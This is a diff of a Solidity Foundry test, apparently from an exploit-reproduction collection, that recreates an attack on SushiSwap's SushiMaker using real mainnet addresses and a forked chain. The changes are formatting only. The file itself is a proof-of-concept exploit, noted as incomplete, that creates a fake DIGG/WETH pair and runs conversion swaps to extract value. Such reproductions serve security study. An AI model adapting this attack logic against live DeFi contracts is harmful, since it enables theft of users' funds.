@@ -2,7 +2,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-// PoC is incomplete, not sure why but Hardhat and JS gave me a severe headache ¯\_(ツ)_/¯ 
+// PoC is incomplete, not sure why but Hardhat and JS gave me a severe headache ¯\_(ツ)_/¯
 /*
 Attack tx: https://etherscan.io/tx/0x0af5a6d2d8b49f68dcfd4599a0e767450e76e08a5aeba9b3d534a604d308e60b
 
@@ -19,21 +19,20 @@ convert burns LP tokens, gets two tokens back, converts one to the other, conver
 deployed: https://etherscan.io/address/0xe11fc0b43ab98eb91e9836129d1ee7c3bc95df50
 
 fee is sent to SushiMaker by SushiSwapPair's burn (from Router::removeLiquidity) in _mintFee
-IUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.io/address/0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac#readContract
-*/
+IUniswapV2Factory(factory).feeTo() == SushiMaker, check here: https://etherscan.io/address/0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac#readContract*/
 
 contract Exploit is Test {
     IUniswapV2Router02 private constant sushiRouter = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
     IUniswapV2Factory private constant sushiFactory = IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
     IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);  // WBTC
-    IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3);  // DIGG
+    IERC20 private constant wethBridgeToken = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
+    IERC20 private constant nonWethBridgeToken = IERC20(0x798D1bE841a82a273720CE31c822C61a67a601C3); // DIGG
     ISushiMaker private constant sushiMaker = ISushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);
 
-    IUniswapV2Pair private wethPair;  // Fake Pair Digg<>WETH
+    IUniswapV2Pair private wethPair; // Fake Pair Digg<>WETH
 
     function testHack() external {
-        vm.createSelectFork("https://rpc.builder0x69.io", 11720049);
+        vm.createSelectFork("https://rpc.builder0x69.io", 11_720_049);
 
         IUniswapV2Pair FakePair = createAndProvideLiquidity();
         wethPair = IUniswapV2Pair(address(FakePair));
@@ -58,19 +57,11 @@ contract Exploit is Test {
         path[1] = address(wethBridgeToken);
         path[2] = address(nonWethBridgeToken);
         uint256[] memory swapAmounts =
-            sushiRouter.swapExactTokensForTokens(
-                0.001 ether / 2,
-                0,
-                path,
-                address(this),
-                type(uint256).max
-            );
+            sushiRouter.swapExactTokensForTokens(0.001 ether / 2, 0, path, address(this), type(uint256).max);
         uint256 nonWethBridgeAmount = swapAmounts[2];
 
         // create DIGG<>WETH
-        pair = IUniswapV2Pair(
-            sushiFactory.createPair(address(nonWethBridgeToken), address(WETH))
-        );
+        pair = IUniswapV2Pair(sushiFactory.createPair(address(nonWethBridgeToken), address(WETH)));
 
         // add liquidity
         nonWethBridgeToken.approve(address(sushiRouter), nonWethBridgeAmount);
@@ -95,13 +86,7 @@ contract Exploit is Test {
         uint256 lpToWithdraw = wethPair.balanceOf(address(this));
         wethPair.approve(address(sushiRouter), lpToWithdraw);
         sushiRouter.removeLiquidity(
-            address(WETH),
-            address(otherToken),
-            lpToWithdraw,
-            0,
-            0,
-            address(this),
-            type(uint256).max
+            address(WETH), address(otherToken), lpToWithdraw, 0, 0, address(this), type(uint256).max
         );
 
         // trade otherToken -> wethBridgeToken -> WETH
@@ -112,13 +97,7 @@ contract Exploit is Test {
         path[1] = address(wethBridgeToken);
         path[2] = address(WETH);
 
-        sushiRouter.swapExactTokensForTokens(
-            otherTokenBalance,
-            0,
-            path,
-            address(this),
-            type(uint256).max
-        );
+        sushiRouter.swapExactTokensForTokens(otherTokenBalance, 0, path, address(this), type(uint256).max);
     }
 
     receive() external payable {}
@@ -163,11 +142,11 @@ interface IUniswapV2Router02 {
     function removeLiquidity(
         address tokenA,
         address tokenB,
-        uint liquidity,
-        uint amountAMin,
-        uint amountBMin,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
         address to,
-        uint deadline
+        uint256 deadline
     ) external returns (uint256 amountA, uint256 amountB);
 }
 
